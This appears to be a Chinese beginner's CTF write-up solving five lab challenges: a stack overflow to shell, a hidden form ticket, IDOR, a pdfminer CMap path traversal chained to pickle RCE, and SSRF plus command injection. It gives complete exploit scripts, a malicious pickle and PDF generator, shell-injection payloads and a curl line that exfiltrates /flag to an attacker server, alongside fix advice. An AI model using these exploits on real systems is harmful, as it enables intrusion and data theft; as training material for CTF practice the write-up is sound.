# 写给新手：新生赛 1444–1448 五道题完整题解

> 只要你会用命令行、知道「IP + 端口」和「浏览器打开网页」是怎么回事，就能看懂。
> 每道题都按同一个节奏写：**要做什么 → 为什么这么做 → 具体怎么做 → 为什么能成功 → 怎么修**。

---

# 第 0 章 先补 10 分钟课

## 0.1 IP、端口、URL

- **IP** 是一台机器的门牌号，比如 `114.66.24.20`。
- **端口**是这台机器上的「门」，同一台机器可以开很多门。比如网页服务常走 `80`/`443`，题目里的靶场是随机端口，如 `54000`、`12685`。
- **URL** 的组成：

```
http://hbc2.haobachang.com:12685/api/device?id=1001
└──┬─┘ └──────┬──────────┘ └─┬─┘└───┬───┘└──┬───┘
 协议        域名(=IP的门牌)  端口    路径     查询参数
```

`?id=1001` 叫**查询参数（query string）**，服务器能读到它，然后决定返回什么。
很多漏洞就是「服务器太相信这个参数了」。

## 0.2 HTTP 请求和响应

你用浏览器打开一个网页，本质是发了一条 HTTP 请求：

```
GET /account?id=10491 HTTP/1.0
Host: hbc2.haobachang.com:41312
```

服务器回一段 HTML。**看网页源码 = 看服务器到底给了你什么**，
很多答案就明晃晃写在里面（第 2 题就是）。

## 0.3 两种「靶机」：HTTP 服务和裸 TCP 服务

| 类型 | 例子 | 你用什么连 |
|---|---|---|
| Web 服务（HTTP） | `http://hbc2.haobachang.com:12685/` | 浏览器、curl |
| 裸 TCP 服务（PWN 题） | `hbc2.haobachang.com:54000` | `nc`、pwntools |

**所以 PWN 题的地址用浏览器打不开是正常的**——它不是网页，是一个等你说话的原始程序。
浏览器只会说 HTTP，对方听不懂，于是显示「无法访问」。

## 0.4 命令行工具速查

```bash
# 发一个 GET 请求
curl -sS "http://host:port/path?参数=值"

# 带「自动编码」的查询参数（推荐，能安全处理 & ; / 等字符）
curl -sS -G "http://host:port/api/proxy" --data-urlencode "url=http://127.0.0.1:8080/config"

# 发 POST 表单
curl -sS -X POST -d "ticket=abc" "http://host:port/api/checkin"

# 连一个裸 TCP 服务
nc host 54000
```

## 0.5 Python 常用两件套

```bash
pip install requests pwntools
```

- `requests`：用 Python 发 HTTP 请求（比 curl 好写逻辑）。
- `pwntools`：专门打 PWN 题的工具库，负责建立 TCP 连接、收发字节。

## 0.6 六个名词，用大白话解释

| 名词 | 大白话 |
|---|---|
| **ELF** | Linux 下的可执行文件格式，相当于 Windows 的 `.exe` |
| **栈（stack）** | 程序运行时的一块「便签纸」，临时变量、函数返回地址都写在这上面 |
| **缓冲区溢出** | 往便签纸上写太多字，超出了自己的格子，把别人格子里的内容盖掉了 |
| **IDOR（越权）** | 该只让你看自己的东西，结果你改了个编号就能看别人的 |
| **SSRF** | 服务器帮你发请求——你借它的身份去访问它内网里的东西 |
| **命令注入** | 程序把用户的输入直接拼进系统命令里，你输入 `;` 就能再塞一条命令 |
| **反序列化** | 把一段数据「还原成对象」。如果数据是攻击者能控制的，还原过程本身就可能执行代码 |
| **路径穿越** | 用 `../` 从「指定目录」一路往上爬，爬到别的地方 |

---

# 第 1 章 1444「客栈」— PWN 栈溢出

## 1.1 题目要你做什么

题目给了一个可执行文件 `get_shell`，靶机地址 `hbc2.haobachang.com:<端口>`。
你要做的事：**让这个远程程序执行 `system("/bin/sh")`，拿到一个 shell，然后 `cat /flag`。**

「shell」就是命令行。拿到它 = 你能在对方机器上执行命令。

## 1.2 先认识敌人：这个程序长什么样

拿到文件，先回答三个问题：

```bash
file get_shell          # 是什么架构
checksec --file=get_shell   # 开了哪些保护
nm get_shell            # 有哪些函数
```

结果：

```
Arch:     amd64-64         # 64 位 Linux 程序
PIE:      No PIE (0x400000) # 程序每次运行都住在同一个地址（好事，对攻击者而言）
NX:       NX enabled        # 栈上不能执行代码（不能直接塞 shellcode）
Stack:    No canary found   # 没有「防溢出警报器」
RELRO:    Partial RELRO    # 改写 GOT 表没被完全禁止
Stripped: No               # 没删符号，函数名都还在
```

**这几个保护都是什么？**

- **Canary（金丝雀）**：函数开头在栈上放一个随机值，函数返回前检查它有没有被改。
  就像在纸上盖了个暗号，溢出一写就会把暗号弄坏，程序立刻自爆。
  → 本题**没有**，所以随便溢出。
- **NX**：把栈标记成「只读不执行」。
  → 所以不能把机器码塞进栈里执行，只能**借用程序自己的函数**（比如 `system`）。
- **PIE**：程序每次运行地址随机。
  → 本题**没有**，地址固定，方便跳转。
- **RELRO**：保护函数地址表（GOT）。
  → Partial 表示没保护全，但本题用不到。

## 1.3 读懂 main 函数（它其实在明示答案）

用 `objdump`/`gdb`/pwntools 反汇编 `main`，还原成 C 大概是这样：

```c
void main(void) {
    char buf[0x40];                    // 64 字节的便签
    void *p = 0x402008;                // 一个指针，初始指向字符串 "echo 复读模式…"
    puts("=== get_shell · 复读机 ===");
    printf("提示：你的输入会被送到 %p\n", buf);   // ★ 把你的便签地址打印出来
    gets(buf);                                   // ★ 无限长度地读入你的输入
    system(p);                                   // ★ 拿 p 当命令执行
}
```

三个关键点：

1. **`gets(buf)` 没有长度限制**。你输入 1000 字节，它就往 64 字节的格子里塞 1000 字节，
   后面的东西全被盖掉 —— 这就是**栈溢出**。
2. **`printf("%p", buf)` 把栈地址告诉你了**。这等于把「你要跳到哪」的答案直接给你。
   题面说的「**记住我的地址**」就是指这里。
3. **`system(p)` 用的是栈变量 `p`**。如果我们在溢出时把 `p` 改成 `buf` 的地址，
   那么程序最后执行的就是 `system(buf)`，而 `buf` 里是我们自己写的字符串。
   题面说的「**呼叫我的名字**」就是指这里。

## 1.4 算出要盖在哪

栈上的布局（地址从高到低）：

```
高地址
  rbp+0x08  ← 返回地址（不用动）
  rbp+0x00  ← 保存的旧的 rbp
  rbp-0x10  ← 变量 p        ← 我们要把这个 8 字节改成 buf 的地址
  ...
  rbp-0x50  ← buf[0]        ← gets 从这里开始写
低地址
```

`buf` 起点是 `rbp-0x50`，`p` 在 `rbp-0x10`，两者相差：

```
0x50 - 0x10 = 0x40 = 64 字节
```

所以 payload 的结构是：

```
[ 8 字节 "/bin/sh\0" ][ 56 字节填充 ][ 8 字节 p 的新值 = buf 地址 ]
└─── buf 的前 8 字节 ──┘└── buf 剩下的 ─┘└───── 正好落在 p 上 ─────┘
      总共 8+56 = 64 = 0x40，刚好把 buf 填满，接下来就是 p
```

`system(buf)` 看到的是字符串 `/bin/sh`，于是执行 `/bin/sh`，shell 到手。

> **为什么是 `/bin/sh\0` 而不是 `/bin/sh`？**  
> C 语言的字符串靠 `\0` 表示结束，不加的话后面的 `AAAA...` 会被当成命令的一部分。

## 1.5 动手：完整 exp

```python
from pwn import *
import re

context.log_level = 'info'

# 1) 连上裸 TCP 靶机
io = remote('hbc2.haobachang.com', 54000)

# 2) 读到提示，从里面抠出泄漏的栈地址
data = io.recvuntil('说点什么吧'.encode(), timeout=10)
print(data)
addr = int(re.search(rb'0x[0-9a-f]+', data).group(), 16)
print('buf 地址 =', hex(addr))

# 3) 拼 payload
payload  = b'/bin/sh\x00'          # 8 字节
payload += b'A' * (0x40 - 8)       # 56 字节填充
payload += p64(addr)               # 把 p 覆盖成 buf 地址（p64 = 打包成 8 字节小端）

# 4) 发过去（gets 以换行结束，所以最后加 \n）
io.send(payload + b'\n')

# 5) 现在对面是 shell 了，执行命令
io.sendline(b'echo PWNED_MARKER; id; ls -la /; cat /flag')
time.sleep(2)
print(io.recvrepeat(5).decode('utf-8', 'replace'))
```

### 一个容易翻车的细节

`gets` 遇到 `\n`（字节 `0x0a`）就停止读入。如果栈地址里恰好含有 `0x0a`，
payload 会被截断，攻击失败。

真实栈地址形如 `0x7ffec6fd4880`，字节是 `80 48 fd c6 fe 7f 00 00`，
不含 `0x0a`，所以一次就成功。**如果遇到失败，多连几次换一个地址就行。**

## 1.6 结果

```
BANNER: === get_shell · 复读机 ===
        提示：你的输入会被送到 0x7ffec6fd4880
        说点什么吧

SHELL OUT:
PWNED_MARKER
uid=10001(ctf) gid=10001(ctf) groups=10001(ctf)
-r--r--r-- 1 ctf ctf 42 Oct 18 04:01 flag
flag{39c70c46-75e8-4bc9-9d80-a765b8da1ada}
```

⚠️ **重要坑**：这种靶机的 flag 是**每个容器实例临时生成**的。
我打了两个实例（54000、32077），flag 各不相同；旧实例被平台回收后，旧 flag 提交会判错。
**读到 flag 立刻提交**，最终用的是当前实例的 `flag{edf06090-1655-4775-ae5d-f71afdd13a15}`。

## 1.7 怎么修

```c
fgets(buf, sizeof(buf), stdin);   // 限制长度，别再 gets
// 不要把栈上的指针当函数参数
// 编译时加：-fstack-protector-all -pie -Wl,-z,relro,-z,now
// 删掉调试用的 printf("%p")
```

---

# 第 2 章 1445「多想留在你房间」— 隐藏的签到场

## 2.1 题目要你做什么

打开 `http://hbc2.haobachang.com:<端口>/`，页面标题是「签到台」。
看起来只有一个「签到」按钮/表单。flag 藏在签到流程里。

## 2.2 思路：网页的答案经常「看不见但存在」

你在浏览器里看到的，是服务器给你的 HTML 经过渲染后的样子。
**源码里可能有一些 `type="hidden"` 的输入框**——它们在页面上完全不可见，
但提交表单时会一起发出去。

这是出题人最爱的考点：**「你看不见 ≠ 不存在」**。

## 2.3 第一步：看源码

在浏览器里按 `Ctrl+U`（查看网页源代码），或者：

```bash
curl -sS "http://hbc2.haobachang.com:25376/" | findstr ticket
```

你会看到：

```html
<form ...>
  <input type="hidden" name="ticket" value="nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY">
</form>
```

`type="hidden"` 就是「隐藏起来」，但 `value` 明明白白写着。
这就是服务器签发的一次性签到凭证。

## 2.4 第二步：找到提交地址

再看同目录的 `/static/app.js`（前端逻辑）：

```javascript
fetch('/api/checkin', { method: 'POST', body: new FormData(form) })
```

或者直接搜页面里的 `<form action="...">`。
结论：把 ticket POST 给 `/api/checkin` 就能完成签到。

## 2.5 动手

```python
import re, requests

root = "http://hbc2.haobachang.com:25376/"
s = requests.Session()

# 1) 打开首页，拿到服务器发的 ticket
r = s.get(root)
ticket = re.search(r'name="ticket" value="([^"]+)"', r.text).group(1)
print("ticket =", ticket)

# 2) 带着 ticket 去签到
rr = s.post(root + "api/checkin", data={"ticket": ticket})
print(rr.text)
```

用 curl 也行：

```bash
curl -sS "http://host:port/" -o page.html
# 手动把 ticket 抠出来，然后：
curl -sS -X POST -d "ticket=nfis8RC-rfXdsvgJt-hrckvNCD2uhHbY" "http://host:port/api/checkin"
```

## 2.6 结果

服务器返回的 HTML 里：

```html
<section class="result">
  <h2>签到凭证</h2>
  <code id="flag">flag{364d2ea883fc4e4a955c7a96b5333ee5}</code>
</section>
```

提交平台 → `{"success": true}`。

同样注意：中途换实例（48340 → 29698 → 25376）拿到了三个不同的 flag，
前两个因实例被回收而失效，最终提交的是 25376 的。

## 2.7 为什么能成功（本质）

签到台的设计是「**服务器发 ticket，客户端存着，用户提交回来换 flag**」。
问题在于：ticket 只是放在页面的隐藏域里，没有任何「绑定当前浏览器会话」的机制。
任何人（甚至不用登录）拿到 ticket 就能换到签到凭证。

严格来说这不是「高危漏洞」，而是一道**观察力题**：
答案一直在你眼前，只是被 `display:none` 了。

## 2.8 怎么修

- 不要用「隐藏表单字段」承载凭证，改由服务端 session 记录；
- ticket 一次性、有时效、并与会话/IP 绑定；
- 校验来源会话，而不是「谁把 ticket 发回来就给谁 flag」。

---

# 第 3 章 1446「我们可以重新开始吗」— 越权读别人资料（IDOR）

## 3.1 题目要你做什么

靶场是一个叫 **Lumen Console** 的 API 控制台。目标：拿到 flag
（它就藏在某个人的「生产密钥」里）。

## 3.2 先逛网站

页面导航：

```
/                 概览
/account?id=10482 个人资料  ← 注意这个 id
/team             组织成员
/docs             接口说明
```

注意 URL：`/account?id=10482`。
`id` 是你的「工号」。**问题来了：如果把 10482 改成别人的工号，会怎样？**

## 3.3 什么是 IDOR

**IDOR = Insecure Direct Object Reference，中文叫「越权访问」或「不安全的直接对象引用」。**

打个比方：酒店前台只核对「你报了房号」就给你房卡，不核对「这房间是不是你订的」。
你把 302 改成 305，就能开别人的房门。

技术上就是：**接口用了一个可预测的标识（工号、订单号、文件 id），
但服务端没有检查「这个标识属不属于当前用户」。**

## 3.4 第一步：找别人的工号

`/team` 页面把组织成员都列了出来：

```bash
curl -sS "http://hbc2.haobachang.com:41312/team"
```

页面里能看到工号：`10482`（当前用户）、`10486`、`10491`、`10507`。

## 3.5 第二步：改 id，一个一个看

先看自己：

```bash
curl -sS "http://hbc2.haobachang.com:41312/account?id=10482"
```

返回里密钥字段是**打码**的：

```html
<code id="api-key">sk-live-••••••••••••0482</code>
```

然后换成别人的工号：

```bash
curl -sS "http://hbc2.haobachang.com:41312/account?id=10491"
```

## 3.6 结果

`10491` 是「周衡 / 平台工程 / 开发者平台」，他的密钥字段：

```html
<code id="api-key">flag{25a64a39de244a8986e5d8e879ae32e5}</code>
<button id="copy-key" data-key="flag{25a64a39de244a8986e5d8e879ae32e5}">复制</button>
```

出题人直接把 flag 塞在「生产密钥」里。

再对照另外两个工号，证明这不是偶然：

```
10482 → sk-live-••••••••••••0482   （自己，打码）
10486 → sk-live-lumen-10486-demo   （别人，明文）
10507 → sk-live-lumen-10507-demo   （别人，明文）
```

**而且整个过程没有登录。** 连 cookie 都不用带。

我还顺手试了 `/keys`、`/api/keys`、`/v1/chat/completions`、`/openapi.json`、`/admin`，
全是 404 —— flag 就在资料页里，不需要再用密钥换什么。

## 3.7 为什么能成功

服务端代码大概是这样的：

```python
@app.route('/account')
def account():
    uid = request.args.get('id')       # 直接拿用户给的 id
    user = db.get_user(uid)            # 直接查
    return render('account.html', user=user)   # 直接渲染
```

少了最关键的一句：

```python
if uid != session['user_id']:
    abort(403)
```

## 3.8 怎么修

- 服务端强制校验：**只能查自己**，或按角色做权限控制（RBAC）；
- 不要用「可枚举的自增 id / 工号」作为访问凭据，用不可猜测的 token；
- 密钥类字段永远打码；要查看明文必须二次认证 + 审计日志。

---

# 第 4 章 1447「全心倾覆，分崩离析」— 解析器里的路径穿越 + 反序列化 RCE

这是五题里最难的一题，我把它拆成「三个零件 + 一次组装」。

## 4.1 题目给了什么

开靶后是一个「惠康CIS」病历抽取系统（Flask 写的）。功能：

| 路径 | 作用 |
|---|---|
| `/charts` | 上传 PDF，后台用 pdfminer 抽文字 |
| `/vault` | 上传文件，返回 `/vault/<一串id>/<文件名>` |
| `/jobs/<id>` | 查看任务状态，页面里有一块「**引擎诊断**」，会显示错误堆栈（Traceback） |

题面说「解析者是一种智械……根据你的大脑神经信号分析你的意图，
以及做基础的安全检查……我好像能跟它对话」——
这是在暗示：**问题出在「解析器」身上**。

## 4.2 零件一：pdfminer 的一个小 bug

服务器用的库是 `pdfminer.six 20250506`。这个库在解析 PDF 字体时，
会读取 PDF 里写的「字体编码表名称」（CMap 名称），然后去磁盘上找同名文件。

源码（`pdfminer/cmapdb.py`）：

```python
def _load_data(cls, name):
    filename = os.path.join(cls._CMAP_PATH, name + ".pickle.gz")  # ← 名称没做任何清洗
    with gzip.open(filename, "rb") as gzfile:
        return type(str(name), (), pickle.loads(gzfile.read()))   # ← 直接反序列化
```

两个致命问题：

1. **`name` 直接拼进路径**。如果 name 里包含 `../`，就能跳出 CMap 目录，
   跑到服务器任意位置找文件 —— 这是**路径穿越**。
2. 找到文件后直接 `pickle.loads()` —— 这是**反序列化**。

## 4.3 零件二：什么是 pickle？为什么它危险？

`pickle` 是 Python 自带的「对象打包」工具：

```python
data = pickle.dumps(obj)   # 把对象变成一串字节（序列化）
obj  = pickle.loads(data)  # 把字节还原成对象（反序列化）
```

问题在于：**pickle 的字节流里可以写「还原时请调用某个函数，并把参数给它」**。
这不是数据，这是一份**可执行的说明书**。

打个比方：

- JSON 像一张购物清单 —— 只能描述东西，不会自己做任何事；
- pickle 像一封「操作指令信」—— 拆开的时候会照着信里的指令去执行。

所以：**只要攻击者能控制被 `pickle.loads` 的字节，就能让服务器执行任意代码。**
这是 Python 里最经典的 RCE 之一。

## 4.4 零件三：/vault 让我们能上传任意文件

`/vault` 允许上传文件并返回访问路径。**但上传文件不是重点，
重点是：上传的文件成了「攻击者可控的字节」。**

把三个零件拼起来：

```
上传恶意 p.pickle.gz → 得到一个可控文件路径
        ↓
构造一个 PDF，让它的字体编码名称用 ../ 穿越到那个文件
        ↓
服务器解析 PDF → 拼路径 → 打开我们的文件 → pickle.loads(我们的字节)
        ↓
代码执行
```

## 4.5 动手第一步：造恶意 pickle

```python
import gzip, pickle

CMD = "echo '---CAT---'; cat /flag; env; id"

CODE = (
    "import subprocess\n"
    "_r = subprocess.run(['/bin/sh','-c', %r], capture_output=True)\n"
    "_o = (_r.stdout or b'') + b'\\n' + (_r.stderr or b'')\n"
    "raise Exception('PWN_RESULT:' + _o.decode('utf-8','replace'))\n"
) % CMD

class Exploit:
    def __reduce__(self):
        # __reduce__ 定义了「这个对象被 pickle 还原时该做什么」
        return (exec, (CODE,))     # 还原时 = exec(CODE)

raw = pickle.dumps(Exploit(), protocol=2)
open("p.pickle.gz", "wb").write(gzip.compress(raw))
```

小知识：`pickle` 有个特殊方法 `__reduce__`，它告诉 pickle
「还原我时请调用 `exec`，参数是 `CODE`」。所以我们写的类在服务器上被还原的瞬间，
`exec(CODE)` 就执行了。

> 为什么用 `exec` 而不是 `os.system`？
> 因为我们是在 Windows 上生成 payload，Windows 的 `os.system` 打包出来在 Linux 上不认。
> 用内置的 `exec` 最稳，跨平台。

上传：

```bash
curl -sS -X POST -F "file=@p.pickle.gz" "http://host:port/vault"
# 返回 {"path": "/vault/63672940/p"}
```

记下这个 id（每次不同）。

## 4.6 动手第二步：造一个「会穿越」的 PDF

PDF 里的字体对象长这样：

```
/Type /Font /Subtype /Type0 /Encoding /<这里放名称> /DescendantFonts [...]
```

`/Encoding` 的值是一个 **PDF Name**。PDF 规范里，Name 里的斜杠 `/` 不能直接写，
要写成 `#2F`（`#` + 两位十六进制 ASCII）。**pdfminer 解析时会把它还原成 `/`。**

我们的目标是让 CMap 的查找路径变成：

```
<CMap目录>/../../../../../../../../../../data/vault/63672940/p.pickle.gz
```

也就是从 CMap 目录往上跳 10 层，再进入 `/data/vault/<id>/p`。

```python
vault_id = "63672940"
raw = ("../" * 10) + f"data/vault/{vault_id}/p"
enc = raw.replace("/", "#2F")     # 把每个 / 变成 #2F
print(enc)
# ..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fdata#2Fvault#2F63672940#2Fp
```

然后拼一个最小可用的 PDF（只需要 6 个对象）：

```python
objs = {}
objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
objs[3] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
           b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>")
objs[4] = (b"<< /Type /Font /Subtype /Type0 /BaseFont /Exploit "
           b"/Encoding /" + enc.encode() + b" /DescendantFonts [6 0 R] >>")
content = b"BT /F1 24 Tf 72 720 Td (AAAA) Tj ET\n"
objs[5] = b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"endstream"
objs[6] = (b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Exploit "
           b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /DW 1000 >>")
```

再按 PDF 规范写文件头、`xref` 表、`trailer`（生成脚本见文末）。
最终得到一个 875 字节的 `exploit.pdf`。

## 4.7 动手第三步：触发

把 PDF 通过 `/charts` 提交：

```bash
curl -sS -X POST -F "file=@exploit.pdf" "http://host:port/charts"
# 返回一个 job_id
curl -sS "http://host:port/jobs/<job_id>"
```

服务器开始解析 PDF → 读到 `/Encoding` → 拼路径 → 打开我们的 `.pickle.gz`
→ `pickle.loads` → `exec(CODE)`。

## 4.8 结果：错误堆栈把命令输出吐了回来

「引擎诊断」页面里：

```
pdfminer.cmapdb DEBUG loading: '../../../../../../../../../../data/vault/63672940/p'

Traceback (most recent call last):
  File "/app/app.py", line 414, in run_extract
  File "/usr/local/lib/python3.12/site-packages/pdfminer/cmapdb.py", line 246, in _load_data
    return type(str(name), (), pickle.loads(gzfile.read()))
  File "<string>", line 4, in <module>
Exception: PWN_RESULT:---CAT---
flag{9ac30a09562d4591b335da23a7e5562c}
---FIND---
/data/.station/flag
/flag
---ENV---
GZCTF_FLAG=flag{9ac30a09562d4591b335da23a7e5562c}
---ID---
uid=10001(app) gid=10001(app) groups=10001(app),100(users)
```

提交 → `{"success": true}`。

## 4.9 为什么能成功（一句话版）

**「文件名的来源」和「文件名的用途」之间没有做检查。**
用户能控制的东西（PDF 里的字体编码名）被当成了文件路径的一部分，
路径又能穿越到用户能上传文件的地方，而那个文件会被反序列化。
**三个「用户可控」叠加 = 远程代码执行。**

## 4.10 如果 Traceback 不回显怎么办

本题运气好，错误信息里带着命令输出。真实场景常见替代方案：

- 把结果写到 `/data/outbox/文件名`，再从 `/outbox/<文件名>` 下载（本题这个目录写不进去）；
- 用 DNS / HTTP 外带：`curl http://你的服务器/$(cat /flag | base64)`；
- 用盲注式判断：`sleep 5` 看响应时间。

## 4.11 怎么修

- 升级 pdfminer.six 到已修复版本（CMap 名称做白名单，禁止 `/`、`..`）；
- **绝不对不可信数据 `pickle.loads`**，改用 JSON 等安全格式；
- 上传目录与解析器查找目录物理隔离（不同挂载点、不同权限）；
- 生产环境关闭 Traceback 回显；
- 解析服务放进沙箱/独立容器，限制文件系统权限。

---

# 第 5 章 1448「来不及等你留下」— SSRF 打进内网，再命令注入

## 5.1 题目要你做什么

靶场是一个「基础设施控制台」，有总览、设备、访客、登录四个页面。
flag 在**内网**里 —— 你得先借服务器的手进去，再让它执行命令。

## 5.2 先看前端代码（这是最快的一条路）

打开 `/static/app.js`，里面直接把后端接口列了出来：

```javascript
var API = {
  devices: "/api/devices",
  events:  "/api/events",
  device:  "/api/device",
  proxy:   "/api/proxy"        // ★ 代理接口
};

function readLocalService(serviceUrl) {
  // 把 serviceUrl 交给服务器，让服务器去请求它
  return fetch(API.proxy + "?url=" + encodeURIComponent(serviceUrl));
}
```

**「把 URL 交给服务器去请求」= 这就是 SSRF 的入口。**

再看 `/api/device?id=1001` 的返回，里面有个字段：

```json
{"service": "http://127.0.0.1:8080", ...}
```

`127.0.0.1` 是 **loopback（本机回环地址）**，意思是「我自己」。
这个服务只监听在本机，外网直接连不到 —— 所以需要 SSRF。

## 5.3 什么是 SSRF

**SSRF = Server-Side Request Forgery，服务端请求伪造。**

大白话：网站有一个功能叫「帮我访问这个 URL」。
你本来应该只让它访问外面的网站，但你没被限制，
于是你让它去访问「它自己家里的」内网服务。

```
你 ──请求──> 公网 Web 服务器 ──请求──> 127.0.0.1:8080（内网，你原本进不去）
```

服务器成了你的「跳板」。很多云厂商的重大事故都是这个原因
（能读到云主机的元数据接口 `169.254.169.254` 拿到临时密钥）。

## 5.4 第一步：确认 SSRF 能用

```bash
curl -sS -G "http://hbc2.haobachang.com:12685/api/proxy" \
     --data-urlencode "url=http://127.0.0.1:8080/config"
```

返回：

```json
{
  "url": "http://127.0.0.1:8080/config",
  "status": 200,
  "body": "{\"service\":\"Internal Device Service\",
            \"listen\":\"127.0.0.1:8080\",
            \"diagnostic\":\"/diagnostic?target=<host>\", ...}"
}
```

三件事被证实：

1. `/api/proxy` **不检查目标**（没协议白名单，没内网地址黑名单）；
2. 它把上游的响应**原样回显**（`status`、`body` 都给你）——这点非常重要，
   有回显才能继续往下打；
3. 内网服务告诉我们它还有一个 `/diagnostic?target=<host>` 接口。

## 5.5 第二步：什么是命令注入

先看内网服务的说明：`/diagnostic` 的作用是「诊断网络」，参数是 `target`。
它的实现大概是这样：

```python
os.popen("ping -c 1 " + target)     # 字符串拼接！
```

如果你传 `target=127.0.0.1`，执行的命令是：

```
ping -c 1 127.0.0.1
```

但如果你传 `target=127.0.0.1;id`，实际执行的是：

```
ping -c 1 127.0.0.1;id
                        └─ 分号 = 「上一条执行完，再执行这条」
```

这就是**命令注入**：服务器把「用户输入」当成了「shell 命令的一部分」。
shell 里能用来切分命令的符号有很多：

```
;     顺序执行
&&    前一条成功才执行
|     管道（把输出传给下一条）
`cmd` 命令替换
$(cmd) 命令替换
```

## 5.6 第三步：执行 id 验证

```bash
curl -sS -G "http://hbc2.haobachang.com:12685/api/proxy" \
     --data-urlencode "url=http://127.0.0.1:8080/diagnostic?target=127.0.0.1;id"
```

返回：

```json
{
  "command": "ping -c 1 127.0.0.1;id",
  "exit": 0,
  "output": "...\nuid=999(service-user) gid=998(service-user) groups=998(service-user),999(deviceops)\n"
}
```

看到 `uid=999(service-user)` 就说明命令真的执行了。
顺带还能看到服务跑在 `service-user` 用户下，属于 `deviceops` 组。

## 5.7 第四步：读 flag

flag 常放在环境变量里（容器化部署的常见做法），用 `printenv` 全部打印：

```bash
curl -sS -G "http://hbc2.haobachang.com:12685/api/proxy" \
     --data-urlencode "url=http://127.0.0.1:8080/diagnostic?target=127.0.0.1;printenv"
```

返回：

```json
{"output": "...\nFLAG=flag{39910e3cda68406aa3b5e6775bf03868}\n..."}
```

提交 → `{"success": true}`。

## 5.8 为什么能成功

两个独立的问题串在一起：

1. `/api/proxy` 允许访问任意地址（包括 `127.0.0.1`）→ **SSRF**；
2. 内网服务把 `target` 直接拼进 shell → **命令注入**。

单独看，命令注入只监听在本机，外网打不到；
单独看，SSRF 只能读内网页面，危害有限。
**组合起来 = 从公网直接拿到命令执行。**

## 5.9 怎么修

**防 SSRF：**
- 目标白名单（只允许访问业务需要的域名）；
- 解析后检查 IP，拒绝 `127.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`169.254.0.0/16`；
- 禁止跟随重定向（否则可用 302 绕过）；
- 内网服务加认证，别只靠「监听 127.0.0.1」。

**防命令注入：**
- 不要用 shell 拼接，改用参数数组：

```python
subprocess.run(["ping", "-c", "1", target], shell=False)
```

- 对 `target` 做严格格式校验（只允许合法主机名/IP）；
- 用最小权限用户运行；
- flag 不要放环境变量里（`printenv` 一把梭）。

---

# 第 6 章 五道题横向总结

| 题号 | 一句话 | 漏洞本质 |
|---|---|---|
| 1444 | 栈溢出 + 地址泄漏，覆盖函数参数指针 | 输入长度无校验 |
| 1445 | 页面源码里的隐藏 ticket | 凭证放客户端 |
| 1446 | 改 URL 里的 id 看别人资料 | 服务端不校验归属（IDOR） |
| 1447 | 上传 pickle + PDF 字体名 `../` 穿越 | 路径穿越 + 反序列化 |
| 1448 | 代理接口打内网 + 分号注入命令 | SSRF + 命令注入 |

## 新手最该记住的 8 条

1. **先看源码**。`Ctrl+U`、`/static/app.js`、`/robots.txt`，比扫目录快得多。
2. **URL 里每个参数都问一句「如果我改了呢」**。改 id、改路径、改主机名。
3. **看返回的是 HTML 还是 JSON**。JSON 说明背后有 API，API 往往比页面更松。
4. **区分「页面」和「服务」**。PWN 题的端口用浏览器打不开，要用 `nc` / pwntools。
5. **动态 flag 立刻提交**。容器题的 flag 每实例不同，实例被回收就失效。
6. **注意平台限制**。同一账号同时只能有一个靶场实例，开新题会把旧题挤掉（表现为 `curl error 7`）。
7. **看错误信息**。本题 1447 的命令输出就是从 Traceback 里读出来的；
   开发者留下的调试信息经常是突破口。
8. **别把「这一条路走不通」当成「这题做不出来」**。
   1447 我试了很多普通文件读取都失败，最后是去读源码
   （`pdfminer.six` 的 `cmapdb.py`）才找到真正的入口。

## 附：1447 的 PDF 生成脚本（完整可跑）

```python
#!/usr/bin/env python3
# make_pdf.py <vault_id>
import sys

vault_id = sys.argv[1] if len(sys.argv) > 1 else "63672940"

# 目标：从 CMap 目录上跳 10 层，进入 /data/vault/<id>/p
raw = ("../" * 10) + f"data/vault/{vault_id}/p"
enc = raw.replace("#", "#23").replace("/", "#2F").encode()

objs = {}
objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
objs[3] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
           b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>")
objs[4] = (b"<< /Type /Font /Subtype /Type0 /BaseFont /Exploit "
           b"/Encoding /" + enc + b" /DescendantFonts [6 0 R] >>")
content = b"BT /F1 24 Tf 72 720 Td (AAAA) Tj ET\n"
objs[5] = (b"<< /Length " + str(len(content)).encode() +
           b" >>\nstream\n" + content + b"endstream")
objs[6] = (b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Exploit "
           b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> "
           b"/DW 1000 >>")

out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
offsets = {}
for num in range(1, 7):
    offsets[num] = len(out)
    out += str(num).encode() + b" 0 obj\n" + objs[num] + b"\nendobj\n"

xref_pos = len(out)
out += b"xref\n0 7\n0000000000 65535 f \n"
for num in range(1, 7):
    out += ("%010d 00000 n \n" % offsets[num]).encode()
out += b"trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n"
out += str(xref_pos).encode() + b"\n%%EOF\n"

open("exploit.pdf", "wb").write(out)
print("wrote exploit.pdf", len(out), "bytes")
```
